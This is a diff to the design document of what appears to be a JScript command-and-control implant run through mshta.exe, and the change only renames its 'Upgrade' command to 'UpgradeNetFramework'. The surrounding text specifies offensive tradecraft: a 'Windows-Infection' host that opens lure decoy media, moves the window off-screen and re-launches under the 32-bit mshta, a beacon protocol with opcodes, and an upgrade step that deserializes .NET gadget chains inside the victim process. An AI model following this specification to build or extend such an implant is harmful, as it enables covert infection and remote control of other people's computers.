@@ -8,7 +8,7 @@ requirement, and no bitness constraint of its own.
 It is pure ES3-era JScript (the engine inside `mshta.exe` / `cscript.exe`, JScript 5.8) — no
 `XMLHttpRequest` host object assumptions, no JSON, no `let`/arrow functions. Every COM object it
 touches (`WScript.Shell`, `MSXML2.ServerXMLHTTP`, `WbemScripting.SWbemLocator`,
-`System.*` for the Upgrade arm) is activated through `ActiveXObject`.
+`System.*` for the UpgradeNetFramework arm) is activated through `ActiveXObject`.
 
 ## Environment contract
 
@@ -21,7 +21,7 @@ The agent carries **no baked configuration**. Its single input is the process en
 Everything else (identity, machine architecture, OS version) is derived on the target at runtime.
 `X-Agent-Capabilities` always ships `0800000000000000` (the
 `UpgradeUsingInsecureBinaryDeserialization` bit, category 3) — every build of this agent carries
-the Upgrade arm.
+the UpgradeNetFramework arm.
 
 ## Host contract
 
@@ -42,14 +42,14 @@ window and process manipulation. The agent itself performs none. Concretely:
 The C2 Windows-Infection master is the reference host: it emits `setHUrl()` (writes `H_URL`),
 `openDecoy()` (lure media, gated to the x86 host), `hideWindow()` (resize + move off-screen),
 `ensureX86Host()` (re-launch the polyglot under `%WINDIR%\SysWOW64\mshta.exe` on 64-bit hosts —
-the x86 CLR is the only usable Upgrade target on every 64-bit OS incl. ARM64), then
+the x86 CLR is the only usable UpgradeNetFramework target on every 64-bit OS incl. ARM64), then
 `runAgent()`, then `quitHost()`:
 
 ```
 setHUrl(); [openDecoy();] hideWindow(); if (ensureX86Host()) return; runAgent(); quitHost();
 ```
 
-The x86 re-host matters because the Upgrade-delivered deserialization chain needs an x86 CLR
+The x86 re-host matters because the UpgradeNetFramework-delivered deserialization chain needs an x86 CLR
 process; the pure beacon loop runs in any bitness (and standalone under cscript).
 
 ## Beacon contract (v2)
@@ -73,7 +73,7 @@ Spoken against the HTTP relay (see the `http-relay` worker — the beacon leg an
 | Opcode | Command | Behavior |
 |---|---|---|
 | `0x0A` | Exit | Sets the exit flag; the loop unwinds and `runAgent()` returns `'exit'`. |
-| `0x0B` | Upgrade | Re-arms the process in place. Payload (ASCII text after the opcode): `!d=`/`!e=` control lines, `NAME=value` env-var lines, a blank line, then `stage1b64\nblobB64`. The agent pins `COMPLUS_Version` itself first (v2.0.50727 on Win7 / build 7600-7601, else v4.0.30319 — the same OS rule the C2 gadget compiler uses), applies the env lines, optionally deserializes the stage-1 blob, then deserializes the main gadget blob (plain drive, or script-driven delegate chain when `!d=1` + entry via `!e=`). Replies u32 as hex: `0` = chain completed, `1` = failed (log carries the message). |
+| `0x0B` | UpgradeNetFramework | Re-arms the process in place. Payload (ASCII text after the opcode): `!d=`/`!e=` control lines, `NAME=value` env-var lines, a blank line, then `stage1b64\nblobB64`. The agent pins `COMPLUS_Version` itself first (v2.0.50727 on Win7 / build 7600-7601, else v4.0.30319 — the same OS rule the C2 gadget compiler uses), applies the env lines, optionally deserializes the stage-1 blob, then deserializes the main gadget blob (plain drive, or script-driven delegate chain when `!d=1` + entry via `!e=`). Replies u32 as hex: `0` = chain completed, `1` = failed (log carries the message). |
 | other | unknown | Replies u32 `2`. |
 
 ## Local verification
